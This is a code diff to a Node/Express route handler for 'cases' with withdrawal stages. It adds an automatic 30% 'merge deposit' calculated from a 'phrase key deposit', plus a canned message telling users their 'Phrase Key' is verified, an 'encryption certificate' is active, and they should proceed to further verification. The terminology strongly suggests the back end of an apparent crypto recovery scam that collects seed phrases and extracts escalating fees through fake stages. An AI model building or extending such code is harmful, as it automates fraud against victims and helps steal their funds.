@@ -120,11 +120,50 @@ export async function registerRoutes(
   app.patch("/api/cases/:id", async (req, res) => {
     try {
       const data = updateCaseSchema.parse(req.body);
+      
+      // Auto-calculate 30% merge deposit when phraseKeyDepositAmount is set
+      if (data.phraseKeyDepositAmount) {
+        // Extract numeric portion and preserve currency suffix
+        const numericMatch = data.phraseKeyDepositAmount.match(/[\d,.]+/);
+        const currencyMatch = data.phraseKeyDepositAmount.match(/[A-Za-z]+$/);
+        const currencySuffix = currencyMatch ? ' ' + currencyMatch[0] : '';
+        
+        if (numericMatch) {
+          const depositAmount = parseFloat(numericMatch[0].replace(/,/g, ''));
+          if (!isNaN(depositAmount)) {
+            const mergeDeposit = depositAmount * 0.30;
+            data.phraseKeyMergeDeposit = mergeDeposit.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + currencySuffix;
+          }
+        }
+      }
+      
+      // Get current case to check for stage changes
+      const currentCase = await storage.getCaseById(req.params.id);
+      const previousStage = currentCase?.withdrawalStage;
+      
       const updated = await storage.updateCase(req.params.id, data);
       if (!updated) {
         res.status(404).json({ error: "Case not found" });
         return;
       }
+      
+      // Auto-send secure message when stage reaches 3 (Phrase Key Approved) and certificate not yet sent
+      if (data.withdrawalStage === '3' && previousStage !== '3' && !updated.phraseKeyCertificateSent) {
+        try {
+          await storage.createAdminMessage({
+            caseId: req.params.id,
+            category: 'resolved',
+            title: 'Phrase Key Certificate Approved',
+            body: `Your Phrase Key has been successfully verified and approved. Your unique encryption certificate has been generated and is now active for withdrawal processing. This certificate is required for all future withdrawal transactions and ensures the security of your funds. Please proceed to the next verification stage.`,
+            isRead: false
+          });
+          // Mark certificate as sent
+          await storage.updateCase(req.params.id, { phraseKeyCertificateSent: true });
+        } catch (msgError) {
+          console.error('Failed to send phrase key certificate message:', msgError);
+        }
+      }
+      
       res.json(updated);
     } catch (error) {
       if (error instanceof z.ZodError) {
